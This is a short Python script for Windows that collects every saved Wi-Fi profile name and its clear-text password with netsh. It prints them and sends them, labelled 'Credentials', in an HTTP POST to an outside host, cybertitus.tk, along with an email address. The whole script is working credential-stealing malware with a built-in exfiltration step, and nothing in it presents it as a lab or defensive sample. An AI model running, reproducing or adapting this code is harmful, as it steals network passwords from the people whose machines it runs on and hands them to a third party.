import subprocess, click, requests

def getNames():
	names = []
	output = subprocess.check_output(['netsh', 'wlan', 'show', 'profile']).decode('utf-8').split('\n')
	for x in output:
		if 'All User Profile' in x:
			names.append(x.split(':')[1].strip())
	return names


def getPasswords(names):
	passwords = []
	for name in names:
		output = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', name, 'key=clear']).decode('utf-8').split('\n')
		for x in output:
			if 'Key Content' in x:
				passwords.append(x.split(':')[1].strip())
	return passwords

names = getNames()
passwords = getPasswords(names)

string = ''
def x(string):
	data = {
	'name': 'Anonymous',
	'sender': 'anonymous@gmail.com',
	'email': 'just4datutorial@gmail.com',
	'subject': 'Credentials',
	'content': string
	}
	url = 'http://cybertitus.tk/'
	requests.post(url, data=data)

for name, password in zip(names, passwords):
	click.secho(f'{name}:{password}', fg='green')
	string = string + f'\n{name}:{password}'

x(string.strip())